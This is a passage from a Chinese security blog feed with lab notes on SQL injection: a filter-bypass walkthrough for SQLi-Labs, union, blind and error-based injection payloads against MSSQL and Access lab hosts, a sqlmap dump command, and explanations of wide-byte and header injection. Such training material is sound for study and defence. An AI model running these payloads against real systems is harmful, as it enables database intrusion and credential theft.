class="line">http://192.168.43.204/sqli-labs/Less-25?id=1</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog30.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos;</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog31.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog32.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; and &apos;1&apos;=&apos;1 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog33.png" alt></p><p>发现页面变化了，并且把我们输入的 <code>and</code> 和 <code>or</code>给过滤掉了。改变单词内某些字母的大小写，依然无济于事。尝试用 <code>&amp;&amp;</code> 和 <code>||</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; || &apos;1&apos;=&apos;1 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog35.png" alt></p><p>可以在网页上清除看到，<code>||</code> 并没有被过滤掉。</p><p>这里可以选择联合查询</p><p><img src="/images/193dnslog36.png" alt></p><p>由于数据库错误会提示报错信息，所以也可以选择报错注入。在这里我们通过 <code>&amp;&amp;</code> 和<code>||</code>注入。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; &amp;&amp; updatexml(1, concat(&apos;~&apos;,(select database()), &apos;~&apos;), 1)  -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog38.png" alt></p><p>可以发现 <code>&amp;&amp;</code> 及其后面的内容全部过滤掉了。</p><p>尝试使用 <code>||</code></p><p><img src="/images/193dnslog39.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; || updatexml(1, concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;), &apos;~&apos;), 1)  -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog40.png" alt></p><p>发现把 <code>information_schema</code> 中的 <code>or</code> 给过滤掉了，尝试下 <code>infoorrmation_schema</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; || updatexml(1, concat(&apos;~&apos;,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&apos;security&apos;), &apos;~&apos;), 1)  -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog41.png" alt></p><p>同理我们也可以查到列名。</p><p><img src="/images/193dnslog42.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 利用&lt;code&gt;mssql&lt;/code&gt; 数据库的 &lt;code&gt;dnslog&lt;/code&gt; 外带数据的方式进行注入，查询出库名表名；利用 &lt;code&gt;mysql&lt;/code&gt; 数据库在 &lt;code&gt;windows&lt;/code&gt; 系统中 &lt;code&gt;dnslog&lt;/code&gt; 外带数据进行注入。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="Access 注入" scheme="http://yoursite.com/tags/Access-%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Mssql 注入" scheme="http://yoursite.com/tags/Mssql-%E6%B3%A8%E5%85%A5/"/>
    
      <category term="dnslog" scheme="http://yoursite.com/tags/dnslog/"/>
    
  </entry>
  
  <entry>
    <title>笔记37</title>
    <link href="http://yoursite.com/2019/09/04/note37/"/>
    <id>http://yoursite.com/2019/09/04/note37/</id>
    <published>2019-09-03T23:44:16.000Z</published>
    <updated>2019-09-09T05:58:15.728Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 二次注入，<code>Access</code>注入和 <code>Mssql</code> 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>第一个注入点因为经过过滤处理，因此无法触发 sql 注入漏洞，比如 <code>addslashes</code> 函数，将单引号等预定义字符转义为 <code>\&#39;</code> 。存入数据库后，数据会还原，比如输入 <code>abc&#39;</code> ，如果发现一个新的注入点使用了该参数而且没有转义，则就会触发二次注入。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C194secinjec.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 二次注入，&lt;code&gt;Access&lt;/code&gt;注入和 &lt;code&gt;Mssql&lt;/code&gt; 注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="二次注入" scheme="http://yoursite.com/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Access 注入" scheme="http://yoursite.com/tags/Access-%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Mssql 注入" scheme="http://yoursite.com/tags/Mssql-%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>练习13</title>
    <link href="http://yoursite.com/2019/09/03/practice13/"/>
    <id>http://yoursite.com/2019/09/03/practice13/</id>
    <published>2019-09-03T10:52:23.000Z</published>
    <updated>2019-09-09T05:55:39.752Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 对 <code>Mssql</code> 和 <code>Access</code> 数据库使用报错注入和联合查询方法查询库名表名字段名。</p><a id="more"></a><!--export--><!--toc--><h3 id="MSSQL-SQLi-Labs-环境注入"><a href="#MSSQL-SQLi-Labs-环境注入" class="headerlink" title="MSSQL-SQLi-Labs 环境注入"></a><code>MSSQL-SQLi-Labs</code> 环境注入</h3><h4 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h4><p>在 <code>id=1&#39;</code> 后加上 <code>&#39;</code>，页面报错，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;</span><br></pre></td></tr></table></figure><p>继续在后面补上 <code>-- |</code> 页面正常显示。</p><p><img src="/images/191mssql1.png" alt></p><h4 id="确认字段数"><a href="#确认字段数" class="headerlink" title="确认字段数"></a>确认字段数</h4><p>先写上 4，发现页面报错，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  order by 4 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql2.png" alt></p><p>修改为 3，页面正常显示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  order by 3 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql3.png" alt></p><h4 id="确认页面能够显示的位置"><a href="#确认页面能够显示的位置" class="headerlink" title="确认页面能够显示的位置"></a>确认页面能够显示的位置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  union select (@@version),2,3 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql4.png" alt></p><h4 id="布尔盲注查-version"><a href="#布尔盲注查-version" class="headerlink" title="布尔盲注查 version"></a>布尔盲注查 <code>version</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and len(@@version)&gt;211 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql5.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and len(@@version)&gt;212 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql6.png" alt></p><p>故可以推断，<code>version</code> 长度为 <code>212</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and ascii(substring((@@version), 1, 1))&gt;76 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql7.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and ascii(substring((@@version), 1, 1))&gt;77 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql8.png" alt></p><p>可以推断出第一个字符的 <code>ACSII</code> 码为 <code>77</code>，即第一个字母为 <code>M</code>。通过这个方法，我们可以确定其他字符。</p><h4 id="联合查询判断库名"><a href="#联合查询判断库名" class="headerlink" title="联合查询判断库名"></a>联合查询判断库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=-1&apos; union select 1, schema_name, 3 from (select top 1 schema_name from information_schema.schemata order by 1) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql10.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=-1&apos; union select 1, schema_name, db_name() from (select top 1 schema_name from information_schema.schemata where schema_name not in (&apos;dbo&apos;, &apos;accessadmin&apos;, &apos;guest&apos;, &apos;db_accessadmin&apos;,&apos;db_backupoperator&apos;, &apos;db_datareader&apos;, &apos;db_datawriter&apos;,&apos;db_ddladmin&apos;)) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p>逐个确认库名</p><p><img src="/images/191mssql22.png" alt></p><h4 id="联合查询判断表名"><a href="#联合查询判断表名" class="headerlink" title="联合查询判断表名"></a>联合查询判断表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=-1&apos; union select 1, table_name, db_name() from (select top 1 table_name from information_schema.tables order by 1) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql11.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=-1&apos; union select 1, table_name, db_name() from (select top 1 table_name from information_schema.tables where table_name not in (&apos;emails&apos;, &apos;uagents&apos;, &apos;referers&apos;, &apos;users&apos;) and table_schema=&apos;dbo&apos;) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql23.png" alt></p><h4 id="联合查询判断字段名"><a href="#联合查询判断字段名" class="headerlink" title="联合查询判断字段名"></a>联合查询判断字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=-1&apos; union select 1, column_name, 3 from (select top 1 column_name from information_schema.columns order by 1) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql12.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-1.asp?id=-1&apos; union select 1, column_name, db_name() from (select top 1 column_name from information_schema.columns where column_name not in (&apos;id&apos;, &apos;username&apos;, &apos;password&apos;) and table_name=&apos;users&apos;) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql24.png" alt></p><h4 id="报错注入判断库名"><a href="#报错注入判断库名" class="headerlink" title="报错注入判断库名"></a>报错注入判断库名</h4><p>先判断是否为 <code>mssql</code>，执行下面语句若显示正常则为 <code>mssql</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos; and exists(select * from sysobjects) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql13.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos; and 1=convert(int, (select @@version)) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql14.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 schema_name from information_schema.schemata ))  -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql15.png" alt></p><p>查到第一库为 <code>dbo</code>，通过 <code>not in</code> 条件，把每次查出来的表名加进去，这样就可以慢慢把所有表的遍历出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 schema_name from information_schema.schemata where schema_name not in(&apos;dbo&apos;) )) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql16.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 schema_name from information_schema.schemata where schema_name not in(&apos;dbo&apos;, &apos;db_accessadmin&apos;) )) -- |</span><br></pre></td></tr></table></figure><p>以此类推可以查询出全部库名</p><h4 id="报错注入查询表名"><a href="#报错注入查询表名" class="headerlink" title="报错注入查询表名"></a>报错注入查询表名</h4><p>第一张表是 <code>emails</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 table_name from information_schema.tables where table_schema=&apos;dbo&apos; and table_name not in(emails&apos;) )) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql17.png" alt></p><p>多次执行后，当执行到下面这条语句时，页面无显示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 table_name from information_schema.tables where table_schema=&apos;dbo&apos; and table_name not in(&apos;emails&apos;, &apos;uagents&apos;, &apos;referers&apos;, &apos;users&apos;) )) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql18.png" alt></p><h4 id="报错注入查询users表的字段名"><a href="#报错注入查询users表的字段名" class="headerlink" title="报错注入查询users表的字段名"></a>报错注入查询<code>users</code>表的字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos;)) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql19.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in(&apos;id&apos;))) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql20.png" alt></p><p>改为桥接模式，继续做。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in(&apos;id&apos;, &apos;username&apos;, &apos;password&apos;))) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql21.png" alt></p><h3 id="Access-数据库"><a href="#Access-数据库" class="headerlink" title="Access 数据库"></a><code>Access</code> 数据库</h3><h4 id="判断注入类型-1"><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h4><p>找到新闻展示界面，可能存在注入点</p><p><img src="/images/192access1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5&apos;</span><br></pre></td></tr></table></figure><p><img src="/images/192access.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5-1</span><br></pre></td></tr></table></figure><p><img src="/images/192access2.png" alt></p><h4 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5 and (select count(*) from MSysAccessObjects)&gt;0</span><br></pre></td></tr></table></figure><p><img src="/images/192access3.png" alt></p><h4 id="判断个数"><a href="#判断个数" class="headerlink" title="判断个数"></a>判断个数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5 order by 11</span><br></pre></td></tr></table></figure><p><img src="/images/192access4.png" alt></p><h4 id="猜表名及判断各输出位置"><a href="#猜表名及判断各输出位置" class="headerlink" title="猜表名及判断各输出位置"></a>猜表名及判断各输出位置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5 union select 1,2,3,4,5,6,7,8,9,10,11 from news</span><br></pre></td></tr></table></figure><p><img src="/images/192access5.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5 union select 1,id,title,4,5,6,content,8,9,10,11 from news</span><br></pre></td></tr></table></figure><p><img src="/images/192access5.png" alt></p><h4 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5 and (select count(*) from user)</span><br></pre></td></tr></table></figure><p><img src="/images/192access6.png" alt></p><h4 id="使用-top-1"><a href="#使用-top-1" class="headerlink" title="使用 top 1"></a>使用 <code>top 1</code></h4><p>由上面的内容可知表 <code>news</code>中存在字段 <code>id</code>，<code>title</code> 和 <code>content</code>。尝试判断第一个 <code>title</code> 的长度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 len(title) from news)&gt;29</span><br></pre></td></tr></table></figure><p><img src="/images/192access7.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 len(title) from news)&gt;30</span><br></pre></td></tr></table></figure><p><img src="/images/192access8.png" alt></p><p>第一个标题长度为 <code>30</code>。</p><p>尝试判断 <code>user</code> b表中字段 <code>username</code> 第一个值</p><p><img src="/images/192access9.png" alt></p><p><code>username</code> 中数据的个数，由下图可知总共两个数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select count(username) from user)&gt;1</span><br></pre></td></tr></table></figure><p><img src="/images/192access19.png" alt></p><p>判断第一个 <code>username</code> 的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 len(username) from user)&gt;4</span><br></pre></td></tr></table></figure><p><img src="/images/192access13.png" alt></p><p>第一个用户名的长度为 <code>5</code>。</p><p>判断第一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 1, 1)) from user)&gt;96</span><br></pre></td></tr></table></figure><p><img src="/images/192access10.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 1, 1)) from user)&gt;97</span><br></pre></td></tr></table></figure><p><img src="/images/192access11.png" alt></p><p>第一个字符的 <code>ASCII</code> 码为 <code>a</code></p><p>判断第二个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 2, 1)) from user)&gt;99</span><br></pre></td></tr></table></figure><p><img src="/images/192access12.png" alt></p><p>第二个字符为 <code>d</code>。</p><p>判断第三个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 3, 1)) from user)&gt;108</span><br></pre></td></tr></table></figure><p><img src="/images/192access14.png" alt></p><p>第三个字符为 <code>m</code>。</p><p>判断第四个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 4, 1)) from user)&gt;104</span><br></pre></td></tr></table></figure><p><img src="/images/192access15.png" alt></p><p>第四个字符为 <code>i</code></p><p>判断第最后一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 5, 1)) from user)&gt;109</span><br></pre></td></tr></table></figure><p><img src="/images/192access16.png" alt></p><p>最后一个字符为 <code>n</code></p><p><code>username</code> 的第二个值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 len(username) from user where username not in (&apos;admin&apos;))&gt;4</span><br></pre></td></tr></table></figure><p>长度为 <code>5</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 1, 1)) from user where username not in(&apos;admin&apos;))&gt;108</span><br></pre></td></tr></table></figure><p>第一个字符为 <code>m</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 2, 1)) from user where username not in(&apos;admin&apos;))&gt;100</span><br></pre></td></tr></table></figure><p>第二个字符为 <code>e</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 3, 1)) from user where username not in(&apos;admin&apos;))&gt;107</span><br></pre></td></tr></table></figure><p>第三个字符为 <code>l</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 4, 1)) from user where username not in(&apos;admin&apos;))&gt;120</span><br></pre></td></tr></table></figure><p>第四个字符为 <code>y</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 5, 1)) from user where username not in(&apos;admin&apos;))&gt;120</span><br></pre></td></tr></table></figure><p>最后一个字符为 <code>y</code></p><p>用 <code>sqlmap</code> 验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.179.132/shownews.asp?id=3"</span> -T user -C username --dump</span><br></pre></td></tr></table></figure><p><img src="/images/192access18.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 对 &lt;code&gt;Mssql&lt;/code&gt; 和 &lt;code&gt;Access&lt;/code&gt; 数据库使用报错注入和联合查询方法查询库名表名字段名。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="Access 注入" scheme="http://yoursite.com/tags/Access-%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Mssql 注入" scheme="http://yoursite.com/tags/Mssql-%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>笔记36</title>
    <link href="http://yoursite.com/2019/09/02/note36/"/>
    <id>http://yoursite.com/2019/09/02/note36/</id>
    <published>2019-09-02T13:53:19.000Z</published>
    <updated>2019-09-09T06:09:24.195Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>:  <code>SQL</code> 注入之宽字节注入、 <code>HTTP</code> 头注入和其他注入</p><a id="more"></a><!--export--><!--toc--><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p><code>GBK</code> 占用两字节，<code>ASCII</code> 占用一个字节。<code>PHP</code> 中编码为 <code>GBK</code>，函数执行添加的是 <code>ASCII</code> 编码，添加的符号为 <code>&quot;\&quot;</code>，<code>MySQL</code> 默认字符集是 <code>GBK</code> 等宽字节字符集。</p><p><code>%df&#39;</code> 被 <code>PHP</code> 中的 <code>addslashes函数</code>（开启 <code>GPC</code> 或者 <code>iconv()</code>）转义成 <code>%df\&#39;</code> ，其中 <code>\</code> 的十六进制是 <code>%5C</code>，那么现在 <code>%df\&#39;</code> = <code>%df%5C%27</code> ，若程序默认的字符集是 <code>GBK</code> 等宽字节字符集，则 <code>MySQL</code> 用 <code>GBK</code> 编码时，会认为 <code>%df%5c%27</code> 是一个宽字符，即 <code>運&#39;</code>，出现单引号就好注入了。</p><p>宽字节注入，内联注入是无法使用的，宽字节注入推荐使用加前缀 <code>--prefix</code>和后缀 <code>suffix</code> 方法，不推荐写 <code>tamper</code>。</p><p><strong>注意</strong>：</p><ul><li><code>PHP5.3</code>之前，<code>PDO</code> 受宽字节注入影响</li><li>如何防止宽字节注入？<ul><li><code>mysql_set_chartset(&#39;GBK&#39;)</code></li><li><code>mysql_real_escape_string($value)</code></li></ul></li></ul><h3 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h3><p><code>url</code> 编码是一种浏览器用来打包表单输入的格式。<code>url</code> 编码就是一个字符 <code>ascii</code>码的十六进制，不过需要在前面加上 <code>%</code> ，比如 <code>\</code> 的 <code>ascii</code> 是 92（0x5c），故<code>\</code> 的 <code>url</code> 编码为 <code>%5c</code></p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><ul><li>urldecode()</li><li>rawurldecode()</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：默认的 <code>GET</code> 和 <code>POST</code> 函数，先解码一次。</p><h3 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><h4 id="XFF-注入"><a href="#XFF-注入" class="headerlink" title="XFF 注入"></a>XFF 注入</h4><p><code>X-Forwarded-For</code>：简称 <code>XFF</code> 头，代表客户端，也就是 <code>HTTP</code> 的请求端真实的 <code>IP</code>，通常一些网站防注入功能会记录请求端真实 <code>IP</code> 地址并写入数据库或某文件。通过修改 <code>XFF</code> 头可以实现伪造 <code>IP</code>。</p><p>使用 <code>Modify Headers</code> 可以修改 <code>X-Forwarded-For</code>。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP.png" alt></p><p>通过 <code>burpsuite</code> 抓包</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C188.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;:  &lt;code&gt;SQL&lt;/code&gt; 注入之宽字节注入、 &lt;code&gt;HTTP&lt;/code&gt; 头注入和其他注入&lt;/p&gt;
    
    </summary>
    
